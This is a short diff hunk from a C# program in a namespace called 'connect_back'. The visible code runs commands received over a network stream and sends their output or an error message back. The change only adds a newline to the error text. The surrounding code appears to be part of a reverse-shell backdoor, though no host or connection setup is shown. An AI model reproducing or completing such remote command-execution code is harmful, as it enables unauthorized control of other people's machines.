@@ -45,7 +45,7 @@ namespace connect_back
 								byte[] results = Encoding.ASCII.GetBytes (prc.StandardOutput.ReadToEnd ());
 								stream.Write (results, 0, results.Length);
 							} catch{
-								string error = "Error running command " + cmd;
+								string error = "Error running command " + cmd + "\n";
 								byte[] errorBytes = Encoding.ASCII.GetBytes (error);
 								stream.Write (errorBytes, 0, errorBytes.Length);
 							}
